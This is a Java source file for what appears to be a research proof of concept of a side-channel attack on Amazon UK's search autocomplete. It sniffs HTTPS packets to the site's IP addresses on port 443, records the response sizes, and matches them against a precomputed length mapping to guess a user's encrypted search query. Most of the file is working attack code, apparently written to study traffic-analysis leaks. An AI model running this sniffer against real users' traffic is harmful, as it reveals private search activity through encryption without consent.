package com.alexsebbe.interceptor;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;

import org.pcap4j.core.PcapNetworkInterface;
import org.pcap4j.util.NifSelector;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;

public class SuggestionInterceptor {
	private final static int HTTPS_PORT = 443, PACKET_RECIEVED_TIMEOUT = 10*60*1000;
			
	private CharacterEntry rootEntry;
	private WebSiteProperties webSiteProperties;
	private PcapNetworkInterface nif;
	
	public static void main(String[] args) {
		CharacterEntry rootEntry = null;
		try {
			rootEntry = JSONSerializer.deSerializeCharacterEntry("mappings/amazon_uk_3_chars.json");
		} catch (JsonParseException e) {
			e.printStackTrace();
		} catch (JsonMappingException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		if(rootEntry == null) {
			return;
		}
		
		// Decide what interface to use
    	PcapNetworkInterface nif;
		try {
			nif = new NifSelector().selectNetworkInterface();
		} catch (IOException e) {
			e.printStackTrace();
			return;
		}

		if (nif == null) {
			return;
		}
		
		SuggestionInterceptor si = new SuggestionInterceptor(AmazonUKProperties.INSTANCE, rootEntry, nif);
		si.run();
		
	}
	
	public SuggestionInterceptor(WebSiteProperties webSiteProperties, CharacterEntry rootEntry, PcapNetworkInterface nif) {
		this.rootEntry = rootEntry;
		this.webSiteProperties = webSiteProperties;
		this.nif = nif;
	}
	
	public void run() {
		// Initialize the emulator
		WebRequestEmulator emulator = new WebRequestEmulator();
    
    	try {
			emulator.initialize();
		} catch (KeyManagementException e1) {
			e1.printStackTrace();
		} catch (NoSuchAlgorithmException e1) {
			e1.printStackTrace();
		} catch (KeyStoreException e1) {
			e1.printStackTrace();
		}
		
		ChunkedSnifferRunner snifferRunner = new ChunkedSnifferRunner(nif, webSiteProperties.getIPAddresses(), HTTPS_PORT);
		// Start sniffer thread
		Thread snifferThread = new Thread(snifferRunner);
		snifferThread.start();
		
		List<List<Integer>> lengths = new ArrayList<List<Integer>>();
		
		
		int i=0;
		while(true) {
			snifferRunner.startNextIteration();
			try {
				try {
					Thread.sleep(700);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				String searchString = "a";
				if(i == 1) {
					searchString = "as";
				} else if (i == 2){
					searchString = "asz";
				}
				String response = emulator.doSearch(searchString, webSiteProperties);
				System.out.println(response);
			} catch (IOException e) {
				e.printStackTrace();
			}
			if(!snifferRunner.waitForPacketsToBeReceived(PACKET_RECIEVED_TIMEOUT)) {
				System.out.println("I have now waited for " + PACKET_RECIEVED_TIMEOUT/(60000) + " minutes, "
						+ "there seems to be no packets coming in. Are you sure you have configured me correctly?");
			}
			
			List<Integer> currLengths = snifferRunner.getCurrentPacketsSizes();
			// The first captures is filled with unrelated packets. Keep only the last one which is the autocomplete response
			if(i == 0) {
				Integer temp = currLengths.get(currLengths.size()-1);
				currLengths.clear();
				currLengths.add(temp);
			}
			
			lengths.add(currLengths);
			printPossibleSolutions(findPossibleSolutions(lengths));
			
			i++;
			if(i == 3) {
				break;
			}
		}
	}

	private void printPossibleSolutions(List<CharacterEntry> entries) {
		if(entries.size() == 0) {
			System.out.println("Found no possible matches. The search query is either non-existant, "
					+ "invalid (i.e. giving no result), or too long to be stored in this program");
			
		}
		System.out.println("I can guess your search query with 1/" + entries.size() + " probability. \nI know that you have performed a search with one of the following queries:");
		for(CharacterEntry ce : entries) {
			System.out.println(ce.getCharaceterSequenceUpToAndIncludingThis());
		}
	}
	
	private List<CharacterEntry> findPossibleSolutions(List<List<Integer>> lengths) {
		List<CharacterEntry> result = new ArrayList<CharacterEntry>();
		findPossibleSolutionsHelper(rootEntry, lengths, 0, result);
		return result;
	}
	
	private void findPossibleSolutionsHelper(CharacterEntry currentEntry, List<List<Integer>> lengths, int depth, List<CharacterEntry> result) {
		for(CharacterEntry child : currentEntry.getChildren()) {
			if(child.getLengths().equals(lengths.get(depth))) {
				if(lengths.size() - 1 == depth) {
					// We got a match. Add it to the return list
					result.add(child);
				} else {
					// Matched on this level, check further down
					findPossibleSolutionsHelper(child, lengths, depth + 1, result);
				}
			}
		}
	}
}
